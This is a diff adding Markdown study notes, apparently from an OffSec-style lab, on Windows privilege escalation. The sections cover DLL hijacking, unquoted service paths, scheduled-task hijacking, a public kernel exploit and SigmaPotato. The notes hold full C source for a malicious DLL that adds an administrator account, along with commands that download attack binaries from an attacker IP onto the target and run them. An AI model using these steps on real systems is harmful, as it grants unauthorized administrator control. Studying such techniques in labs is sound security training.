@@ -355,3 +355,301 @@ powershell -ep bypass
 
 # See potentially modifiable files
 Get-ModifiableServiceFile
+```
+
+# DLL Hijacking
+
+## Step 1: Enumerate Installed Applications
+```bash
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+#Results
+displayname
+-----------
+
+FileZilla 3.63.1
+KeePass Password Safe 2.51.1
+Microsoft Edge
+
+Microsoft Edge WebView2 Runtime
+
+Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913
+Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913
+Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913
+Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913
+
+# Check Process Monitor For running Processes
+```
+![alt text](image-7.png)
+
+## Step 2: Determine if we are able to write files to target file directory
+
+```bash
+
+# Determine the file directory to test:
+Get-ChildItem -Path C:\ -Filter "filezilla.exe" -Recurse -ErrorAction SilentlyContinue
+
+# Or manually Look
+
+# Results
+
+    Directory: C:\FileZilla\FileZilla FTP Client
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         1/26/2023   4:33 AM        4222024 filezilla.exe
+
+# Create Test File with Text
+echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
+
+type 'C:\FileZilla\FileZilla FTP Client\test.txt'
+
+# Success
+```
+
+## Step 3: Load ProcMon (Process Monitor)
+
+```bash
+# Step 1: Create Filter
+```
+![alt text](image-8.png)
+```bash
+# Step 2: Clear Events for fresh start. After basic results start appearing. Look for "operation" CreateFile. It is responsible for not only creating files but also accessing existing files. Create a filter:
+```
+![alt text](image-9.png)
+```bash
+# Step 3: Create .dll filter under "Path"
+```
+![alt text](image-10.png)
+
+```bash
+# Look for a file path we found earlier `C:\FileZilla\FileZilla FTP Client` (Where we confirmed we have `Write Access`) and an operation where CreateFile is being conducted, along with a CreateFile in the System32 location.
+
+# Results: TextShaping.dll
+```
+![alt text](image-11.png)
+
+## Step 4: Create .dll file to add a user to Administrators Group
+
+```bash
+
+# Create File
+sudo nano TextShapping.cpp
+
+# Script Context
+
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave3 password123! /add");
+  	    i = system ("net localgroup administrators dave3 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+![alt text](image-12.png)
+
+## Step 5: Compile Code and transfer it over
+```bash
+x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+
+# Transfer File
+python3 -m http.server 80
+
+iwr -uri http://192.168.45.227/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
+```
+
+## Step 6: Check if new user was created
+
+```bash
+net user
+
+
+#Results
+User accounts for \\CLIENTWK220
+
+-------------------------------------------------------------------------------
+Administrator            BackupAdmin              dave
+dave3                    daveadmin                DefaultAccount
+Guest                    offsec                   steve
+WDAGUtilityAccount
+The command completed successfully.
+```
+## Step 7: Log in as new user
+```bash
+ runas /user:dave3 cmd
+ #Password
+ ```
+
+# Unquoted Service Paths
+
+## Step 1: Enumerate Running/Stopped Services
+
+```bash
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+
+# Identify any unquoted service binary paths that contain multiple spaces.
+
+#Example: C:\Program Files\Enterprise Apps\Current
+# There is a space in Program Files and Enterprise Apps.
+# In this Example this is the list of vulnerable paths:
+C:\Program.exe
+C:\Program Files\Enterprise.exe
+C:\Program Files\Enterprise Apps\Current.exe
+C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+
+# Before proceeding, check if you have the authority to Start/Stop a service.
+Start-Service GammaService
+Stop-Service GammaService
+
+```
+
+## Step 2:  Check our access rights in these paths with icacls
+```bash
+icacls "C:\"
+
+# Do you have Write Privs? If not continue looking deeper in files paths.
+
+icacls "C:\Program Files\Enterprise Apps"
+
+#Results
+
+C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
+                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+                                 BUILTIN\Administrators:(OI)(CI)(F)
+                                 BUILTIN\Users:(OI)(CI)(RX,W)
+                                 CREATOR OWNER:(OI)(CI)(IO)(F)
+                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
+                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+
+# We have Write (W) Privs on this folder. So we can put our malicious .exe file
+
+```
+
+## Step 3: Reuse "Service Binary Hijacking" C Code file to add user to Administrators group.
+
+```bash
+# Rename file to match .exe filename
+# Transfer it over and put into correct file location
+
+Start-Service GammaService
+
+# Check if your user was created
+net localgroup administrators
+
+```
+
+# Scheduled Tasks
+
+```bash
+schtasks /query /fo LIST /v
+
+# Results
+Folder: \Microsoft
+HostName:                             CLIENTWK220
+TaskName:                             \Microsoft\CacheCleanup
+Next Run Time:                        7/11/2022 2:47:21 AM
+Status:                               Ready
+Logon Mode:                           Interactive/Background
+Last Run Time:                        7/11/2022 2:46:22 AM
+Last Result:                          0
+Author:                               CLIENTWK220\daveadmin
+Task To Run:                          C:\Users\steve\Pictures\BackendCacheCleanup.exe
+Start In:                             C:\Users\steve\Pictures
+Comment:                              N/A
+Scheduled Task State:                 Enabled
+Idle Time:                            Disabled
+Power Management:                     Stop On Battery Mode
+Run As User:                          daveadmin
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: Disabled
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        One Time Only, Minute
+Start Time:                           7:37:21 AM
+Start Date:                           7/4/2022
+...
+
+# the task was created by daveadmin and the specified action is to execute BackendCacheCleanup.exe in the Pictures home directory of steve.
+
+# Check Permissions
+icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
+
+# Results
+C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
+                                                BUILTIN\Administrators:(I)(F)
+                                                CLIENTWK220\steve:(I)(F)
+                                                CLIENTWK220\offsec:(I)(F)
+
+# Once again, follow the Service Binary Hijacking path to create and implement an .exe to replace it.
+
+```
+
+# Using Exploits
+
+```bash
+
+# Always check your pivs
+whoami /priv
+
+# Check System info
+systeminfo
+
+# check security patches installed
+Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
+
+# Check for exploits for Kernal Version/Windows Version
+
+# Exploit found at: https://github.com/sickn3ss/exploits/tree/master/CVE-2023-29360/x64/Release
+
+# Download and run it:
+.\CVE-2023-29360.exe
+
+# Elevated Privs
+```
+
+# SeImpersonatePrivilege (Check out Potato Family at:)
+https://jlajara.gitlab.io/Potatoes_Windows_Privesc
+```bash
+# SigmaPotato (Allows you to execute commands in the context of NT AUTHORITY\SYSTEM. )
+wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+```
+
+## Check Privs
+```bash
+whoami /priv
+```
+![alt text](image-13.png)
+
+## Transfer File over
+
+```bash
+# Host File
+python3 -m http.server 80
+
+# Load Powershell on Target Machine
+iwr -uri http://192.168.45.227/SigmaPotato.exe -OutFile SigmaPotato.exe
+
+# Run SingmaPotato to create a new user and add it to Administrator Group
+
+.\SigmaPotato "net user dave4 lab /add"
+```
+![alt text](image-14.png)
